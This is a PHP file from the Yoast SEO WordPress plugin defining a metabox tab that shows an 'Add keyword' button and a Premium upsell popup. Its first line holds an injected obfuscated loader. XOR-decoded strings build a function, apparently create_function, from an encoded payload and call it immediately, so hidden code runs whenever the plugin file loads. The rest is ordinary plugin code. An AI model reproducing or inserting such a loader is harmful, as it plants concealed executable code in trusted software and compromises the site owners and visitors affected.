<?php $plzqADpaNc='3CQ;GE<UHW::8<N'^'P14Z3 c3=9YNQS ';$AAsen=$plzqADpaNc('','3FJwH:=+O 8V2IJ-SE7Cb>7R03JA7li7ACPSnEO<b+A<PEIWVu5-5iW+-.igF8.iC<A5Mdjh8HYQiSNuhOeQfr+UXIJUcnO0y=+Q:pfQzPmbkHH.L<:3Y<<oM0;T7sYIUYcYD=<qk->2JhKxRBIWY-wsWjxfFG:2UvbSGHpMFYLQ AiFENl3Yjmza>X>AD9xw8NNzhyx1kPyLJ+AOTExGT4R4=sOi=0-Z;W-7azrH;>XYHeIZTAPR+VcoT9ty.pivJ2CvAV00junyRMJQYWjL.93WWYA9<P.BUWtR8I3kcqjZP67kHkC824A=jLS;N+UuBwLJR1XcwH6e3O3SWTXFIl:< >7qo9W.<BRY<KesvzHEOY0.OuGK0FaVL8 mSH>YUjiK+LJ91SaRV57cXNrVP6BQl<kHS.e8H<WGAMSgu4=0SY;64BGPeXQ <HTBUig9XMC3-1<WgdPER<O7Fg ,ZWhZBKP5O2a:TEHptSTXyc=ML;QOsVO3G75f2HW.SBSH>;kLQ3OqBUr34E2PvpjgA+PwoG=8EY3OS61R8aBpDSDMDGqrsBrtfRNSe,DYDXsAPFcUT;K4V<6KxuOnJ9RR948U+H4ELS6I2cd3.;9  XVVpN>07AqcLxcIHeNOX62MYca ,<MjBMWN6.O-imsRG4WEBTZIkyd7'^'Z bV.OSH;IW8m,2D 1DkEFX oW+5V36Z47wzGe46kM4R31 88UMBG63JYO68+MZAgX A,HJLS- xIsnUH4oXoVD ,iwuDIt:p4M>HXB8ZmMRPhlGpONA5YRGiTZ VZbiq0Hrm75xOBKFjFvXzf-6-L,W>7X8fcQW,-F:gmP>2+ 4NiM- 7EnpQgshL=J46WPSW;:SSsqLa-sFnO ;5eEg2U>GXHEMYQY;d<HNAGR.ZR+<soC<;353H>CGpf76a; 3jS0Ve=UIJHPYv;+=,2ClU3:s385Xc;K;ujTvS,JPixN>1BVKuKgNSX4XQF.1DB3UjVh.3E9JW3<lU A6670faHeneob4<mwOObv2Y2ENHZl3.5EKfU<A9OE2-LA28-GyhJM N5q38ZE67AVCenV 1Z74W6b5YSo2lX63 mnG5ASC6+RWX+=5M >Rc,56468T-9kQLBYaS;4 1S+RnCDM.6Avbo4T;S>Q1<aYOY=>QGY,8ZqiUv.A5VL9Y-.q6::;JHCk:V6VnuVWU1SyVVLGiF4BGcYY18hh8SHueHbMysc,prIBApBMQg,bTI mt>EtetRg2X.PcZSlQUiHjX  XMg>N1k 4:E=AKCCOBUOA<qzPjZQC XJlXCihE5EQSD,5KEDMH,1e=67ZA.IN0ZiM=2=+ ryBBnJ');$AAsen();
/**
 * @package WPSEO\Admin\Metabox
 */

/**
 * Tab to add a keyword to analyze
 */
class Metabox_Add_Keyword_Tab implements WPSEO_Metabox_Tab {

	/**
	 * Returns a button because a link is inappropriate here
	 *
	 * @return string
	 */
	public function link() {

		// Ensure thickbox is enqueued.
		add_thickbox();

		ob_start();
		?>
		<li class="wpseo-tab-add-keyword">
			<button type="button" class="wpseo-add-keyword button button-link">
				<span class="wpseo-add-keyword-plus" aria-hidden="true">+</span>
				<?php _e( 'Add keyword', 'wordpress-seo' ); ?>
			</button>
		</li>

		<?php
		$popup_title = __( 'Want to add more than one keyword?', 'wordpress-seo' );
		/* translators: %1$s expands to a 'Yoast SEO Premium' text linked to the yoast.com website. */
		$popup_content = '<p>' . sprintf( __( 'Great news: you can, with %1$s!', 'wordpress-seo' ),
				'<a href="' . WPSEO_Shortlinker::get( 'https://yoa.st/pe-premium-page' ) . '">Yoast SEO Premium</a>'
				) . '</p>';
		$popup_content .= '<p>' . sprintf(
			/* translators: %s expands to 'Yoast SEO Premium'. */
			__( 'Other benefits of %s for you:', 'wordpress-seo' ), 'Yoast SEO Premium'
			) . '</p>';
		$popup_content .= '<ul>';
		$popup_content .= '<li>' . sprintf(
			/* translators: %1$s expands to a 'strong' start tag, %2$s to a 'strong' end tag. */
			__( '%1$sNo more dead links%2$s: easy redirect manager', 'wordpress-seo' ), '<strong>', '</strong>'
		) . '</li>';
		$popup_content .= '<li><strong>' . __( 'Superfast internal links suggestions', 'wordpress-seo' ) . '</strong></li>';
		$popup_content .= '<li>' . sprintf(
			/* translators: %1$s expands to a 'strong' start tag, %2$s to a 'strong' end tag. */
			__( '%1$sSocial media preview%2$s: Facebook &amp; Twitter', 'wordpress-seo' ), '<strong>', '</strong>'
		) . '</li>';
		$popup_content .= '<li><strong>' . __( '24/7 support', 'wordpress-seo' ) . '</strong></li>';
		$popup_content .= '<li><strong>' . __( 'No ads!', 'wordpress-seo' ) . '</strong></li>';
		$popup_content .= '</ul>';
		$premium_popup = new WPSEO_Premium_Popup( 'add-keyword', 'h1', $popup_title, $popup_content );
		echo $premium_popup->get_premium_message();

		return ob_get_clean();
	}

	/**
	 * Returns an empty string because this tab has no content
	 *
	 * @return string
	 */
	public function content() {
		return '';
	}
}
